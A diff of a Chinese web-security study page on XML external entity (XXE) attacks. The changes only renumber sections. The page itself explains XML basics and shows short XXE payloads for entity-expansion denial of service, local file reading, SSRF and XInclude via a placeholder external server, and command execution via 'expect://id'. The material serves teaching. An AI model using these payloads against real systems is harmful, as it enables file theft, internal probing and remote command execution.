@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <title>4.10. XXE &mdash; Web安全学习笔记 1.0 documentation</title>
+  <title>4.11. XXE &mdash; Web安全学习笔记 1.0 documentation</title>
   
 
   
@@ -35,8 +35,8 @@
   <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="4.11. 模版注入" href="ssti.html" />
-    <link rel="prev" title="4.9. 文件包含" href="fileinclude.html" /> 
+    <link rel="next" title="4.12. 模版注入" href="ssti.html" />
+    <link rel="prev" title="4.10. 文件包含" href="fileinclude.html" /> 
 </head>
 
 <body class="wy-body-for-nav">
@@ -90,37 +90,38 @@
 <li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. 计算机网络与协议</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. 信息收集</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">4. 常见漏洞攻防</a><ul class="current">
-<li class="toctree-l2"><a class="reference internal" href="sql/index.html">4.1. SQL注入</a></li>
-<li class="toctree-l2"><a class="reference internal" href="xss/index.html">4.2. XSS</a></li>
-<li class="toctree-l2"><a class="reference internal" href="csrf.html">4.3. CSRF</a></li>
-<li class="toctree-l2"><a class="reference internal" href="ssrf.html">4.4. SSRF</a></li>
-<li class="toctree-l2"><a class="reference internal" href="cmdinjection.html">4.5. 命令注入</a></li>
-<li class="toctree-l2"><a class="reference internal" href="pathtraversal.html">4.6. 目录穿越</a></li>
-<li class="toctree-l2"><a class="reference internal" href="fileread.html">4.7. 文件读取</a></li>
-<li class="toctree-l2"><a class="reference internal" href="fileupload.html">4.8. 文件上传</a></li>
-<li class="toctree-l2"><a class="reference internal" href="fileinclude.html">4.9. 文件包含</a></li>
-<li class="toctree-l2 current"><a class="current reference internal" href="#">4.10. XXE</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#xml">4.10.1. XML基础</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#id1">4.10.2. 基本语法</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#id2">4.10.3. XXE</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#id3">4.10.4. 攻击方式</a><ul>
-<li class="toctree-l4"><a class="reference internal" href="#id4">4.10.4.1. 拒绝服务攻击</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id5">4.10.4.2. 文件读取</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#ssrf">4.10.4.3. SSRF</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#rce">4.10.4.4. RCE</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#xinclude">4.10.4.5. XInclude</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owasp.html">4.1. 解读2017OWASPTop10漏洞体系</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sql/index.html">4.2. SQL注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xss/index.html">4.3. XSS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="csrf.html">4.4. CSRF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ssrf.html">4.5. SSRF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="cmdinjection.html">4.6. 命令注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pathtraversal.html">4.7. 目录穿越</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileread.html">4.8. 文件读取</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileupload.html">4.9. 文件上传</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileinclude.html">4.10. 文件包含</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">4.11. XXE</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#xml">4.11.1. XML基础</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id1">4.11.2. 基本语法</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id2">4.11.3. XXE</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id3">4.11.4. 攻击方式</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id4">4.11.4.1. 拒绝服务攻击</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id5">4.11.4.2. 文件读取</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#ssrf">4.11.4.3. SSRF</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#rce">4.11.4.4. RCE</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#xinclude">4.11.4.5. XInclude</a></li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#id6">4.10.5. 参考链接</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id6">4.11.5. 参考链接</a></li>
 </ul>
 </li>
-<li class="toctree-l2"><a class="reference internal" href="ssti.html">4.11. 模版注入</a></li>
-<li class="toctree-l2"><a class="reference internal" href="xpath.html">4.12. Xpath注入</a></li>
-<li class="toctree-l2"><a class="reference internal" href="logic.html">4.13. 逻辑漏洞 / 业务漏洞</a></li>
-<li class="toctree-l2"><a class="reference internal" href="config.html">4.14. 配置安全</a></li>
-<li class="toctree-l2"><a class="reference internal" href="middleware/index.html">4.15. 中间件</a></li>
-<li class="toctree-l2"><a class="reference internal" href="webcache.html">4.16. Web Cache欺骗攻击</a></li>
-<li class="toctree-l2"><a class="reference internal" href="httpSmuggling.html">4.17. HTTP 请求走私</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ssti.html">4.12. 模版注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xpath.html">4.13. Xpath注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="logic.html">4.14. 逻辑漏洞 / 业务漏洞</a></li>
+<li class="toctree-l2"><a class="reference internal" href="config.html">4.15. 配置安全</a></li>
+<li class="toctree-l2"><a class="reference internal" href="middleware/index.html">4.16. 中间件</a></li>
+<li class="toctree-l2"><a class="reference internal" href="webcache.html">4.17. Web Cache欺骗攻击</a></li>
+<li class="toctree-l2"><a class="reference internal" href="httpSmuggling.html">4.18. HTTP 请求走私</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="../language/index.html">5. 语言与框架</a></li>
@@ -177,7 +178,7 @@
         
           <li><a href="index.html"><span class="section-number">4. </span>常见漏洞攻防</a> &raquo;</li>
         
-      <li><span class="section-number">4.10. </span>XXE</li>
+      <li><span class="section-number">4.11. </span>XXE</li>
     
     
       <li class="wy-breadcrumbs-aside">
@@ -197,13 +198,13 @@
            <div itemprop="articleBody">
             
   <div class="section" id="xxe">
-<h1><span class="section-number">4.10. </span>XXE<a class="headerlink" href="#xxe" title="Permalink to this headline">¶</a></h1>
+<h1><span class="section-number">4.11. </span>XXE<a class="headerlink" href="#xxe" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="xml">
-<h2><span class="section-number">4.10.1. </span>XML基础<a class="headerlink" href="#xml" title="Permalink to this headline">¶</a></h2>
+<h2><span class="section-number">4.11.1. </span>XML基础<a class="headerlink" href="#xml" title="Permalink to this headline">¶</a></h2>
 <p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p>
 </div>
 <div class="section" id="id1">
-<h2><span class="section-number">4.10.2. </span>基本语法<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h2>
+<h2><span class="section-number">4.11.2. </span>基本语法<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h2>
 <p>XML 文档在开头有 <code class="docutils literal notranslate"><span class="pre">&lt;?xml</span> <span class="pre">version=&quot;1.0&quot;</span> <span class="pre">encoding=&quot;UTF-8&quot;</span> <span class="pre">standalone=&quot;yes&quot;?&gt;</span></code> 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。</p>
 <p>除了可选的开头外，XML 语法主要有以下的特性：</p>
 <ul class="simple">
@@ -216,13 +217,13 @@
 <p>另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。</p>
 </div>
 <div class="section" id="id2">
-<h2><span class="section-number">4.10.3. </span>XXE<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
+<h2><span class="section-number">4.11.3. </span>XXE<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
 <p>当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。</p>
 </div>
 <div class="section" id="id3">
-<h2><span class="section-number">4.10.4. </span>攻击方式<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
+<h2><span class="section-number">4.11.4. </span>攻击方式<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="id4">
-<h3><span class="section-number">4.10.4.1. </span>拒绝服务攻击<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
+<h3><span class="section-number">4.11.4.1. </span>拒绝服务攻击<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;!DOCTYPE data [
 &lt;!ELEMENT data (#ANY)&gt;
 &lt;!ENTITY a0 &quot;dos&quot; &gt;
@@ -236,7 +237,7 @@
 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
 </div>
 <div class="section" id="id5">
-<h3><span class="section-number">4.10.4.2. </span>文件读取<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h3>
+<h3><span class="section-number">4.11.4.2. </span>文件读取<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE data [
 &lt;!ELEMENT data (#ANY)&gt;
@@ -247,7 +248,7 @@
 </div>
 </div>
 <div class="section" id="ssrf">
-<h3><span class="section-number">4.10.4.3. </span>SSRF<a class="headerlink" href="#ssrf" title="Permalink to this headline">¶</a></h3>
+<h3><span class="section-number">4.11.4.3. </span>SSRF<a class="headerlink" href="#ssrf" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
 &lt;!ELEMENT data (#ANY)&gt;
@@ -257,7 +258,7 @@
 </div>
 </div>
 <div class="section" id="rce">
-<h3><span class="section-number">4.10.4.4. </span>RCE<a class="headerlink" href="#rce" title="Permalink to this headline">¶</a></h3>
+<h3><span class="section-number">4.11.4.4. </span>RCE<a class="headerlink" href="#rce" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
 &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
@@ -270,7 +271,7 @@
 </div>
 </div>
 <div class="section" id="xinclude">
-<h3><span class="section-number">4.10.4.5. </span>XInclude<a class="headerlink" href="#xinclude" title="Permalink to this headline">¶</a></h3>
+<h3><span class="section-number">4.11.4.5. </span>XInclude<a class="headerlink" href="#xinclude" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&#39;1.0&#39;?&gt;
 &lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;
 </pre></div>
@@ -278,7 +279,7 @@
 </div>
 </div>
 <div class="section" id="id6">
-<h2><span class="section-number">4.10.5. </span>参考链接<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h2>
+<h2><span class="section-number">4.11.5. </span>参考链接<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h2>
 <ul class="simple">
 <li><p><a class="reference external" href="http://www.w3school.com.cn/xml/">XML教程</a></p></li>
 <li><p><a class="reference external" href="https://security.tencent.com/index.php/blog/msg/69">未知攻焉知防 XXE漏洞攻防</a></p></li>
@@ -296,10 +297,10 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="ssti.html" class="btn btn-neutral float-right" title="4.11. 模版注入" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="ssti.html" class="btn btn-neutral float-right" title="4.12. 模版注入" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
-        <a href="fileinclude.html" class="btn btn-neutral float-left" title="4.9. 文件包含" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+        <a href="fileinclude.html" class="btn btn-neutral float-left" title="4.10. 文件包含" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
       
     </div>
   
